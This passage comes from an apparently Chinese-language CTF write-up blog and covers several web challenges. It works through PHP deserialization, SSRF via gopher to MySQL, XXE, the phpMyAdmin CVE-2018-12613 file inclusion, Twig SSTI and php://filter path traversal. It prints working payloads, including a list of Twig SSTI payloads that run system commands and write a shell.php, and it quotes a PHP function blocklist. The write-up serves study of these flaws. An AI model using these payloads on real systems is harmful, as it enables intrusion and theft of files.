class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;phpinfo&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;proc_terminate&quot;</span>,<span class="string">&quot;touch&quot;</span>,<span class="string">&quot;escapeshellcmd&quot;</span>,<span class="string">&quot;escapeshellarg&quot;</span>,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;substr_replace&quot;</span>,<span class="string">&quot;call_user_func_array&quot;</span>,<span class="string">&quot;call_user_func&quot;</span>,<span class="string">&quot;array_filter&quot;</span>, <span class="string">&quot;array_walk&quot;</span>,  <span class="string">&quot;array_map&quot;</span>,<span class="string">&quot;registregister_shutdown_function&quot;</span>,<span class="string">&quot;register_tick_function&quot;</span>,<span class="string">&quot;filter_var&quot;</span>, <span class="string">&quot;filter_var_array&quot;</span>, <span class="string">&quot;uasort&quot;</span>, <span class="string">&quot;uksort&quot;</span>, <span class="string">&quot;array_reduce&quot;</span>,<span class="string">&quot;array_walk&quot;</span>, <span class="string">&quot;array_walk_recursive&quot;</span>,<span class="string">&quot;pcntl_exec&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwrite&quot;</span>,<span class="string">&quot;file_put_contents&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">gettime</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        <span class="variable">$a</span>= <span class="title function_ invoke__">gettype</span>(<span class="variable">$result</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span> = <span class="string">&quot;Y-m-d h:i:s a&quot;</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;func != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$this</span>-&gt;func, <span class="variable">$this</span>-&gt;p);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$func</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;func&quot;</span>];</span><br><span class="line">    <span class="variable">$p</span> = <span class="variable">$_REQUEST</span>[<span class="string">&quot;p&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$func</span> != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="variable">$func</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>,<span class="variable">$disable_fun</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">gettime</span>(<span class="variable">$func</span>, <span class="variable">$p</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Hacker...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>
<h3 id="过滤的挺全，但是我们可以利用Test类的魔术方法-destruct-来绕过过滤，也就是利用反序列化，利用call-user-func-来构造unserialize函数进行反序列化"><a href="#过滤的挺全，但是我们可以利用Test类的魔术方法-destruct-来绕过过滤，也就是利用反序列化，利用call-user-func-来构造unserialize函数进行反序列化" class="headerlink" title="过滤的挺全，但是我们可以利用Test类的魔术方法__destruct()来绕过过滤，也就是利用反序列化，利用call_user_func()来构造unserialize函数进行反序列化"></a>过滤的挺全，但是我们可以利用Test类的魔术方法__destruct()来绕过过滤，也就是利用反序列化，利用call_user_func()来构造unserialize函数进行反序列化</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$p</span>;</span><br><span class="line">        <span class="keyword">var</span> <span class="variable">$func</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="comment">//$a-&gt;p=&quot;ls /&quot;;</span></span><br><span class="line">    <span class="comment">//$a-&gt;p=&quot;find -name *flag*&quot;;</span></span><br><span class="line">    <span class="variable">$a</span>-&gt;p=<span class="string">&quot;cat /tmp/flagoefiu4r93&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="先ls-一下没有发现flag，所以直接find找，找到后cat就拿到flag了"><a href="#先ls-一下没有发现flag，所以直接find找，找到后cat就拿到flag了" class="headerlink" title="先ls /一下没有发现flag，所以直接find找，找到后cat就拿到flag了"></a>先<code>ls /</code>一下没有发现flag，所以直接find找，找到后cat就拿到flag了</h3><p><img src="https://pick.lwzheng.tech/2025/02/08/67a62e6d71483.png" alt="1.png"><br><img src="https://pick.lwzheng.tech/2025/02/08/67a62f2a5e2eb.png" alt="2.png"></p>
<h1 id="EasySignin-1"><a href="#EasySignin-1" class="headerlink" title="EasySignin"></a>EasySignin</h1><h3 id="打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。-1"><a href="#打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。-1" class="headerlink" title="打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。"></a>打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。</h3><h3 id="登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。-1"><a href="#登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。-1" class="headerlink" title="登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。"></a>登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。</h3><p><img src="https://pick.lwzheng.tech/2025/02/06/67a4848218532.png" alt="aec355635e14bccdca6768fae37c33e1.png"></p>
<h3 id="登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了-1"><a href="#登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了-1" class="headerlink" title="登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了"></a>登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了</h3><h3 id="然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵-1"><a href="#然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵-1" class="headerlink" title="然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵"></a><del>然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵</del></h3><p><img src="https://pick.lwzheng.tech/2025/02/06/67a485a2b494f.png" alt="c27da523d674e0448bfbbf1ed157d4f3.png"></p>
<h3 id="这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v-nonono-，也就是代表可能被过滤-1"><a href="#这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v-nonono-，也就是代表可能被过滤-1" class="headerlink" title="这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v(nonono)，也就是代表可能被过滤"></a>这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v(nonono)，也就是代表可能被过滤</h3><blockquote>
<p>到这里就不得不提gopherus这个工具的使用了：此工具可以自动生成 Gopher payload，以利用 SSRF并获得 RCE。<br>该工具的攻击范围：<br>MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)</p>
</blockquote>
<h3 id="这里可以用gopher-127-0-0-1-端口来判断那一个能攻击-1"><a href="#这里可以用gopher-127-0-0-1-端口来判断那一个能攻击-1" class="headerlink" title="这里可以用gopher://127.0.0.1:端口来判断那一个能攻击"></a>这里可以用<code>gopher://127.0.0.1:端口</code>来判断那一个能攻击</h3><h3 id="然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令show-database-和select-load-file-flag-了，这里使用默认MySQL用户名root，然后url编码一次即可。-1"><a href="#然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令show-database-和select-load-file-flag-了，这里使用默认MySQL用户名root，然后url编码一次即可。-1" class="headerlink" title="然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令show database;和select load_file(&#39;/flag&#39;);了，这里使用默认MySQL用户名root，然后url编码一次即可。"></a>然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令<code>show database;</code>和<code>select load_file(&#39;/flag&#39;);</code>了，这里使用默认MySQL用户名root，然后url编码一次即可。</h3><p><img src="https://pick.lwzheng.tech/2025/02/06/67a489c734b9d.png" alt="e09d2af5cece4ad2171defcd8479c126.png"></p>
<h3 id="将回显base64解码得到flag-1"><a href="#将回显base64解码得到flag-1" class="headerlink" title="将回显base64解码得到flag"></a>将回显base64解码得到flag</h3><p><img src="https://pick.lwzheng.tech/2025/02/06/67a489e223c67.png" alt="8a2d5d67fe10cf69bedb2ffda563ef62.png"></p>
<h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><h3 id="一个有关xxe漏洞的题"><a href="#一个有关xxe漏洞的题" class="headerlink" title="一个有关xxe漏洞的题"></a>一个有关xxe漏洞的题</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/logic1001/article/details/144674219">xxe漏洞</a></p>
<blockquote>
<p>XXE漏洞原理<br>漏洞成因：解析时未对XML外部实体加以限制，导致攻击者将恶意代码注入到XML中，导致服务器加载恶意的外部实体引发文件读取，SSRF，命令执行等危害操作。<br>特征：在HTTP的Request报文出现一下请求报文，即表明此时是采用XML进行数据传输，就可以测试是否存在XML漏洞。<br>Content-type:text&#x2F;xml application&#x2F;xml</p>
</blockquote>
<blockquote>
<p>DTD<br>文档类型定义（DTD）：可以合法的XML文档构建模块，可以被声明在XML的文档中，也可以作为一个外部的引用。这里也就是XXE存在的地方。<br>外部实体<br>有SYSTEM和PUBLIC两个关键字，表示实体来自本地计算机还是公共计算机，<br>外部实体的引用可以利用如下协议<br>file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext<br><a target="_blank" rel="noopener" href="http://url/file.ext">http://url/file.ext</a><br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;conf.php<br>例如:<br><code>&lt;!DOCTYPE foo [     &lt;!ELEMENT foo ANY &gt;     &lt;!ENTITY  % xxe SYSTEM &quot;http://xxx.xxx.xxx/evil.dtd&quot; &gt; %xxe; ]&gt;</code><br><code>&lt;foo&gt;&amp;evil;&lt;/foo&gt;</code><br>外部evil.dtd中的内容<br><code>&lt;!ENTITY evil SYSTEM “file:///d:/1.txt” &gt;</code></p>
</blockquote>
<p>###这个题直接抓包写xxe即可</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">user</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">password</span>&gt;</span>any<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://pics.lwzheng.tech/2025/02/11/67ab09e2cab3e.png" alt="e3e0b725-36bc-4b83-9ec8-5fa91df20593.png"></p>
<h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><h3 id="打开还是几乎啥也没有，直接dirsearch扫，扫出来phpmyadmin页面，为phpmyadmin数据库"><a href="#打开还是几乎啥也没有，直接dirsearch扫，扫出来phpmyadmin页面，为phpmyadmin数据库" class="headerlink" title="打开还是几乎啥也没有，直接dirsearch扫，扫出来phpmyadmin页面，为phpmyadmin数据库"></a>打开还是几乎啥也没有，直接dirsearch扫，扫出来phpmyadmin页面，为phpmyadmin数据库</h3><h3 id="查询相关漏洞并注意phpmyadmin版本为4-8-1，判断可能有CVE-2018-12613（文件包含漏洞，phpMyAdmin-4-8-0-4-8-1）"><a href="#查询相关漏洞并注意phpmyadmin版本为4-8-1，判断可能有CVE-2018-12613（文件包含漏洞，phpMyAdmin-4-8-0-4-8-1）" class="headerlink" title="查询相关漏洞并注意phpmyadmin版本为4.8.1，判断可能有CVE-2018-12613（文件包含漏洞，phpMyAdmin 4.8.0-4.8.1）"></a>查询相关漏洞并注意phpmyadmin版本为4.8.1，判断可能有CVE-2018-12613（文件包含漏洞，phpMyAdmin 4.8.0-4.8.1）</h3><p><img src="https://pics.lwzheng.tech/2025/02/11/67ab3180176f9.png" alt="df4575b4e0c69976f9fe7acc4af54183.png"></p>
<h3 id="然后尝试包含本地文件，得到flag"><a href="#然后尝试包含本地文件，得到flag" class="headerlink" title="然后尝试包含本地文件，得到flag"></a>然后尝试包含本地文件，得到flag</h3><p><img src="https://pics.lwzheng.tech/2025/02/11/67ab31a7b5aa8.png" alt="8b1f1e65cf444a8168bb979fbca58a19.png"></p>
<h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><h3 id="flag页面能登录，登录后会回显出我们输入的用户名，要想到ssti模版注入"><a href="#flag页面能登录，登录后会回显出我们输入的用户名，要想到ssti模版注入" class="headerlink" title="flag页面能登录，登录后会回显出我们输入的用户名，要想到ssti模版注入"></a>flag页面能登录，登录后会回显出我们输入的用户名，要想到ssti模版注入</h3><p><img src="https://i-blog.csdnimg.cn/blog_migrate/b2abfa0590e2a701f26f896a4b5dbb82.png" alt="e3e0b725-36bc-4b83-9ec8-5fdf20593.png"></p>
<blockquote>
<p>各种语言发生ssti注入的模板，如下：<br>python: jinja2 mako tornado django<br>php:smarty twig Blade<br>java:jade velocity jsp</p>
</blockquote>
<h3 id="尝试后为Twig模块"><a href="#尝试后为Twig模块" class="headerlink" title="尝试后为Twig模块"></a>尝试后为Twig模块</h3><blockquote>
<p>twig常用的注入payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;app.request.files.get(1).__construct(&#x27;/etc/passwd&#x27;,&#x27;&#x27;)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;app.request.files.get(1).openFile.fread(99)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;_self.env.enableDebug()&#125;&#125;&#123;&#123;_self.env.isDebug()&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)|join(&quot;,&quot;)</span><br><span class="line">&gt;&#123;&#123;&#123;&quot;&lt;?php phpinfo();&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;[&quot;id&quot;,0]|sort(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;[0,0]|reduce(&quot;system&quot;,&quot;id&quot;)|join(&quot;,&quot;)&#125;&#125;</span><br><span class="line">&gt;&#123;&#123;[&#x27;cat /etc/passwd&#x27;]|filter(&#x27;system&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure></blockquote>
<h3 id="直接输入回显你想干什么，联系题目判断可能要从cookie处注入，bp抓包又漏信息，cookie都抓不全"><a href="#直接输入回显你想干什么，联系题目判断可能要从cookie处注入，bp抓包又漏信息，cookie都抓不全" class="headerlink" title="直接输入回显你想干什么，联系题目判断可能要从cookie处注入，bp抓包又漏信息，cookie都抓不全"></a>直接输入回显你想干什么，联系题目判断可能要从cookie处注入，<del>bp抓包又漏信息，cookie都抓不全</del></h3><h3 id="浏览器看到登录请求包里面的cookie有user这一项，将其修改为注入命令，成功得到flag"><a href="#浏览器看到登录请求包里面的cookie有user这一项，将其修改为注入命令，成功得到flag" class="headerlink" title="浏览器看到登录请求包里面的cookie有user这一项，将其修改为注入命令，成功得到flag"></a>浏览器看到登录请求包里面的cookie有user这一项，将其修改为注入命令，成功得到flag</h3><blockquote>
<p><code>&#123;&#123; _self.env.registerUndefinedFilterCallback("exec") &#125;&#125;&#123;&#123; _self.env.getFilter("id") &#125;&#125;</code></p>
</blockquote>
<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><h3 id="访问两个按钮可以看猫猫和狗狗，注意到url上category在猫猫和狗狗之间改变，尝试伪协议读取源代码-category-php-filter-read-convert-base64-encode-resource-index-php"><a href="#访问两个按钮可以看猫猫和狗狗，注意到url上category在猫猫和狗狗之间改变，尝试伪协议读取源代码-category-php-filter-read-convert-base64-encode-resource-index-php" class="headerlink" title="访问两个按钮可以看猫猫和狗狗，注意到url上category在猫猫和狗狗之间改变，尝试伪协议读取源代码?category=php://filter/read=convert.base64-encode/resource=index.php"></a>访问两个按钮可以看猫猫和狗狗，注意到url上category在猫猫和狗狗之间改变，尝试伪协议读取源代码<code>?category=php://filter/read=convert.base64-encode/resource=index.php</code></h3><h3 id="然后报错回显include-php-filter-read-convert-base64-encode-resource-index-php-php-，这里既能看出来确实可以伪协议读取，也能看出来我们的-php多余了，猜测可能会自动补-php"><a href="#然后报错回显include-php-filter-read-convert-base64-encode-resource-index-php-php-，这里既能看出来确实可以伪协议读取，也能看出来我们的-php多余了，猜测可能会自动补-php" class="headerlink" title="然后报错回显include(php://filter/read=convert.base64-encode/resource=index.php.php)，这里既能看出来确实可以伪协议读取，也能看出来我们的.php多余了，猜测可能会自动补.php"></a>然后报错回显<code>include(php://filter/read=convert.base64-encode/resource=index.php.php)</code>，这里既能看出来确实可以伪协议读取，也能看出来我们的.php多余了，猜测可能会自动补.php</h3><h3 id="去掉-php后成功读取到源代码，重要的一段为"><a href="#去掉-php后成功读取到源代码，重要的一段为" class="headerlink" title="去掉.php后成功读取到源代码，重要的一段为"></a>去掉.php后成功读取到源代码，重要的一段为</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt; ?php</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;category&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;woofers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;meowers&quot;</span> ) !==  <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>( <span class="variable">$file</span>, <span class="string">&quot;index&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">include</span> (<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Sorry, we currently only support woofers and meowers.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="然后就是读取flag了，这里dirsearch应该是能扫出来flag-php的，但是经典没扫出来，扫出来后发现只有-所以还是要伪协议读取flag-php"><a href="#然后就是读取flag了，这里dirsearch应该是能扫出来flag-php的，但是经典没扫出来，扫出来后发现只有-所以还是要伪协议读取flag-php" class="headerlink" title="然后就是读取flag了，这里dirsearch应该是能扫出来flag.php的，但是经典没扫出来，扫出来后发现只有&lt;!-- Can you read this flag? --&gt;,所以还是要伪协议读取flag.php"></a>然后就是读取flag了，这里dirsearch应该是能扫出来flag.php的，但是经典没扫出来，扫出来后发现只有<code>&lt;!-- Can you read this flag? --&gt;</code>,所以还是要伪协议读取flag.php</h3><blockquote>
<p>filter伪协议可以套一层参数，如(本题中包含woofers,meowers,index三个中的一个即可)：<br>?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag 或<br>?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;index&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag (顺序可以变换)</p>
</blockquote>
<blockquote>
<p>插一个知识点是PHP对文件是否存在不关心，因为他只关心你最终所在的目录位置，甚至中间多套几层也不影响<br>所以可以构造payload去尝试读取flag.php文件<br>category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;meowers&#x2F;..&#x2F;flag</p>
</blockquote>
<h3 id="然后base64解码得到flag"><a href="#然后base64解码得到flag" class="headerlink" title="然后base64解码得到flag"></a>然后base64解码得到flag</h3><h1 id="安洵杯-2019-easy-serialize-php-php反序列化字符串逃逸"><a href="#安洵杯-2019-easy-serialize-php-php反序列化字符串逃逸" class="headerlink" title="[安洵杯 2019]easy_serialize_php   php反序列化字符串逃逸"></a>[安洵杯 2019]easy_serialize_php   php反序列化字符串逃逸</h1><h3 id="访问后点击直接给了源代码"><a href="#访问后点击直接给了源代码" class="headerlink" title="访问后点击直接给了源代码"></a>访问后点击直接给了源代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"> &lt; ?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$function</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$img</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$img</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>)&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;function&#x27;</span>] = <span class="variable">$function</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);   <span class="comment">//替换post为变量，可覆盖</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$function</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ 